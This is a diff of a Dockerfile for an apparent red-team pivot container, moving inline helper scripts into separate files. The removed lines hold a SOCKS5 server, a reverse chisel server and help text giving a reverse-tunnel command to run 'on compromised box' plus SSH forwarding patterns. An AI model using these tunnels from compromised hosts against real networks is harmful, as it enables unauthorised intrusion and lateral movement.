@@ -31,70 +31,8 @@ RUN set -eux; \
 COPY --from=gobuilder /go/bin/chisel /usr/local/bin/chisel
 
 # ---- pivot helpers ----
-RUN cat > /usr/local/bin/gw-socks5 <<'SH'
-#!/usr/bin/env bash
-# SOCKS5 server on 0.0.0.0:1080 (microsocks). Bind a real iface in production.
-set -euo pipefail
-PORT="${1:-1080}"
-USER_AUTH="${MICROSOCKS_USER:-}"
-PASS_AUTH="${MICROSOCKS_PASS:-}"
-args=(-p "$PORT" -i 0.0.0.0)
-[ -n "$USER_AUTH" ] && [ -n "$PASS_AUTH" ] && args+=(-u "$USER_AUTH" -P "$PASS_AUTH")
-echo "[pivot] microsocks :$PORT (auth=${USER_AUTH:+yes}${USER_AUTH:-no})"
-exec microsocks "${args[@]}"
-SH
-RUN chmod +x /usr/local/bin/gw-socks5
-
-RUN cat > /usr/local/bin/gw-chisel-server <<'SH'
-#!/usr/bin/env bash
-# Reverse chisel server for victim-side SOCKS5 callback.
-# Client side: chisel client <server>:<port> R:1080:socks
-set -euo pipefail
-PORT="${1:-8080}"
-KEY="${CHISEL_KEY:-}"
-args=(server -p "$PORT" --reverse)
-[ -n "$KEY" ] && args+=(--key "$KEY")
-echo "[pivot] chisel server :$PORT (reverse mode)"
-exec chisel "${args[@]}"
-SH
-RUN chmod +x /usr/local/bin/gw-chisel-server
-
-RUN cat > /usr/local/bin/gw-wg-up <<'SH'
-#!/usr/bin/env bash
-set -euo pipefail
-CFG="${1:-/work/wg0.conf}"
-[ -f "$CFG" ] || { echo "config not found: $CFG" >&2; exit 2; }
-sudo wg-quick up "$CFG"
-SH
-RUN chmod +x /usr/local/bin/gw-wg-up
-
-RUN cat > /usr/local/bin/gw-pivot-help <<'SH'
-#!/usr/bin/env bash
-cat <<HELP
-[pivot] common patterns:
-
-SOCKS5 server (this box):
-  gw-socks5 [port]                # microsocks on 0.0.0.0:1080
-
-Reverse SOCKS via chisel:
-  gw-chisel-server 8080            # this side (listens on :8080)
-  # On compromised box:
-  chisel client this-host:8080 R:1080:socks
-
-WireGuard:
-  gw-wg-up /work/wg0.conf
-
-OpenVPN:
-  sudo openvpn /work/client.ovpn
-
-SSH dynamic forward (turn this box into your SOCKS5):
-  ssh -D 0.0.0.0:1080 -N user@jumpbox
-
-SSH tunnel-only (sshuttle):
-  sshuttle -r user@jumpbox 10.0.0.0/8 0/0
-HELP
-SH
-RUN chmod +x /usr/local/bin/gw-pivot-help
+COPY scripts/gw-socks5 scripts/gw-chisel-server scripts/gw-wg-up scripts/gw-pivot-help /usr/local/bin/
+RUN chmod +x /usr/local/bin/gw-socks5 /usr/local/bin/gw-chisel-server /usr/local/bin/gw-wg-up /usr/local/bin/gw-pivot-help
 
 COPY scripts/ghostwire-pivot.profile.sh /etc/profile.d/ghostwire-pivot.sh
 RUN echo '. /etc/profile.d/ghostwire-pivot.sh' >> /home/ghost/.bashrc
